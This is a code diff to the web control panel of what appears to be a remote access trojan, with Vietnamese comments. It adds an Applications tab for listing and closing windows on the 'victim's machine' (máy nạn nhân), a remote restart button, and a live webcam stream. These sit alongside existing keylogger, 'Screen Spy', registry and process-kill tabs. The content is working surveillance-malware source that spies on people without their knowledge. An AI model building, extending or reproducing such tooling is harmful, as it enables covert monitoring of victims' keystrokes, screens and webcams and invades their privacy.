@@ -70,9 +70,11 @@
                 <ul class="nav flex-column">
                     <li class="nav-item"><a class="nav-link active" onclick="showTab('dashboard')"><i class="fa-solid fa-gauge"></i> Dashboard</a></li>
                     <li class="nav-item"><a class="nav-link" onclick="showTab('process')"><i class="fa-solid fa-microchip"></i> Process</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('apps')"><i class="fa-brands fa-windows"></i> Applications</a></li>
                     <li class="nav-item"><a class="nav-link" onclick="showTab('registry')"><i class="fa-brands fa-windows"></i> Registry</a></li>
                     <li class="nav-item"><a class="nav-link" onclick="showTab('screen')"><i class="fa-solid fa-camera"></i> Screen Spy</a></li>
                     <li class="nav-item"><a class="nav-link" onclick="showTab('keylog')"><i class="fa-solid fa-keyboard"></i> Keylogger</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('webcam')"><i class="fa-solid fa-video"></i> Webcam Stream</a></li>
                 </ul>
             </div>
 
@@ -83,7 +85,18 @@
                 <div id="dashboard" class="content-section active">
                     <h3>Dashboard</h3>
                     <div class="alert alert-info">Chào mừng! Hãy chọn một Agent từ menu bên trái để bắt đầu.</div>
-                    <button class="btn btn-danger" onclick="sendCommand('SHUTDOWN', '')"><i class="fa-solid fa-power-off"></i> Tắt máy Target</button>
+
+                    <div class="d-flex gap-2">
+                        <!-- Nút Shutdown cũ -->
+                        <button class="btn btn-danger" onclick="sendCommand('SHUTDOWN', '')">
+                            <i class="fa-solid fa-power-off"></i> Tắt máy Target
+                        </button>
+
+                        <!-- Nút Restart MỚI -->
+                        <button class="btn btn-warning" onclick="sendCommand('RESTART', '')">
+                            <i class="fa-solid fa-rotate-right"></i> Khởi động lại
+                        </button>
+                    </div>
                 </div>
 
                 <!-- Process -->
@@ -98,6 +111,40 @@
                     <table class="table table-bordered bg-white shadow-sm">
                         <thead class="table-dark"><tr><th>ID</th><th>Process Name</th><th>Threads</th><th>Action</th></tr></thead>
                         <tbody id="processTable"></tbody>
+                    </table>
+                </div>
+
+
+                <!-- Applications -->
+                <div id="apps" class="content-section">
+                    <div class="d-flex justify-content-between mb-3">
+                        <h3>Applications Manager</h3>
+                        <div>
+                            <button class="btn btn-primary btn-sm" onclick="sendCommand('GET_APPS', '')">
+                                <i class="fa-solid fa-sync"></i> Làm mới
+                            </button>
+                            <button class="btn btn-success btn-sm" onclick="startProgram('START_APP')">
+                                <i class="fa-solid fa-plus"></i> Chạy App Mới
+                            </button>
+                        </div>
+                    </div>
+
+                    <div class="alert alert-secondary">
+                        <small>Đây là danh sách các cửa sổ đang hiển thị trên Taskbar của máy nạn nhân.</small>
+                    </div>
+
+                    <table class="table table-striped table-hover bg-white shadow-sm border">
+                        <thead class="table-primary">
+                            <tr>
+                                <th>PID</th>
+                                <th>File Name</th>
+                                <th>Window Title (Tiêu đề cửa sổ)</th>
+                                <th>Action</th>
+                            </tr>
+                        </thead>
+                        <tbody id="appTable">
+                            <!-- Dữ liệu đổ vào đây -->
+                        </tbody>
                     </table>
                 </div>
 
@@ -157,6 +204,33 @@
                     <div class="terminal" id="keylogData"></div>
                 </div>
 
+                <!-- Webcam -->
+                <div id="webcam" class="content-section">
+                    <div class="d-flex justify-content-between mb-3 align-items-center">
+                        <h3>Live Webcam</h3>
+                        <div>
+                            <!-- Bộ đếm thông tin -->
+                            <span class="badge bg-secondary me-2">FPS: <span id="fpsCounter">0</span></span>
+                            <span class="badge bg-info text-dark me-3" id="webcamStatus">Stopped</span>
+
+                            <button class="btn btn-success" onclick="sendCommand('WEBCAM_START', '')">
+                                <i class="fa-solid fa-play"></i> Bật Cam
+                            </button>
+                            <button class="btn btn-danger" onclick="stopWebcamUI()">
+                                <i class="fa-solid fa-stop"></i> Tắt Cam
+                            </button>
+                        </div>
+                    </div>
+
+                    <!-- Khung hiển thị Video -->
+                    <div class="card bg-dark text-center p-2">
+                        <!-- Ảnh mặc định khi chưa bật cam -->
+                        <img id="webcamImg" src="https://via.placeholder.com/640x480?text=Webcam+Off"
+                             style="max-width: 100%; height: auto; border: 1px solid #444;">
+                    </div>
+                </div>
+
+
             </div>
         </div>
     </div>
@@ -165,6 +239,8 @@
         const MY_ID = "WEB_" + Date.now();
         const ws = new WebSocket("ws://localhost:8080"); // Đổi IP nếu cần
         let currentAgent = "";
+        let frameCount = 0;
+        let lastFpsTime = Date.now();
 
         ws.onopen = () => {
             document.getElementById("status").innerText = "Connected";
@@ -202,6 +278,25 @@
                             <td><button class='btn btn-sm btn-danger' onclick="killProc(${p.Id})">Kill</button></td></tr>`;
                     });
                 }
+                else if (cmd === "APP_LIST") {
+                    const list = JSON.parse(data);
+                    const tbody = document.getElementById("appTable");
+                    tbody.innerHTML = "";
+
+                    list.forEach(app => {
+                        tbody.innerHTML += `
+                <tr>
+                    <td>${app.Id}</td>
+                    <td class="fw-bold text-primary">${app.Name}</td>
+                    <td>${app.Title}</td>
+                    <td>
+                        <button class='btn btn-sm btn-danger' onclick="killApp(${app.Id})">
+                            <i class="fa-solid fa-xmark"></i> Close
+                        </button>
+                    </td>
+                </tr>`;
+                    });
+                }
                 else if (cmd === "PIC_DATA") {
                     addScreenToGallery(data);
                 }
@@ -211,6 +306,32 @@
                 else if (cmd === "LOG_MSG" || cmd === "REG_RESULT") {
                     if (cmd === "REG_RESULT") document.getElementById("regOutput").innerText += "\n> " + data;
                     else alert("Agent: " + data);
+                }
+
+                // --- XỬ LÝ FRAME WEBCAM MỚI ---
+                if (cmd === "WEBCAM_FRAME") {
+                    // 1. Cập nhật ảnh ngay lập tức
+                    document.getElementById("webcamImg").src = "data:image/jpeg;base64," + data;
+                    document.getElementById("webcamStatus").innerText = "Live Streaming";
+                    document.getElementById("webcamStatus").className = "badge bg-success me-3";
+
+                    // 2. Tính toán FPS (Bộ đếm)
+                    frameCount++;
+                    const now = Date.now();
+                    if (now - lastFpsTime >= 1000) { // Mỗi 1 giây cập nhật số FPS
+                        document.getElementById("fpsCounter").innerText = frameCount;
+                        frameCount = 0;
+                        lastFpsTime = now;
+                    }
+                }
+                else if (cmd === "LOG_MSG") {
+                    // Hiển thị thông báo trạng thái
+                    if (data.includes("Đã tắt")) {
+                        document.getElementById("webcamStatus").innerText = "Stopped";
+                        document.getElementById("webcamStatus").className = "badge bg-secondary me-3";
+                    }
+                    // alert(data); // Có thể tắt alert cho đỡ phiền khi streaming
+                    console.log("Agent log:", data);
                 }
             }
         };
@@ -257,12 +378,32 @@
 
         function killProc(pid) { if (confirm("Kill " + pid + "?")) sendCommand("KILL_PROCESS", pid); }
         function startApp() { const n = prompt("Tên App:"); if (n) sendCommand("START_PROCESS", n); }
+        function killApp(pid) {
+            if (confirm("Bạn có chắc muốn đóng cửa sổ ứng dụng (PID: " + pid + ") không?")) {
+                sendCommand("KILL_APP", pid);
+                // Tự động load lại danh sách sau 1s
+                setTimeout(() => sendCommand('GET_APPS', ''), 1000);
+            }
+        }
+
+        // Cập nhật hàm startApp cũ (hoặc viết hàm mới dùng chung)
+        function startProgram(cmdType) {
+            const n = prompt("Nhập tên chương trình (vd: notepad, calc):");
+            if (n) sendCommand(cmdType, n);
+        }
 
         function showTab(id) {
             document.querySelectorAll(".content-section").forEach(d => d.classList.remove('active'));
             document.getElementById(id).classList.add('active');
             document.querySelectorAll(".nav-link").forEach(d => d.classList.remove('active'));
             event.target.closest('.nav-link').classList.add('active');
+        }
+
+        function stopWebcamUI() {
+            sendCommand('WEBCAM_STOP', '');
+            // Reset ảnh về mặc định
+            document.getElementById("webcamImg").src = "https://via.placeholder.com/640x480?text=Webcam+Stopped";
+            document.getElementById("fpsCounter").innerText = "0";
         }
     </script>
 
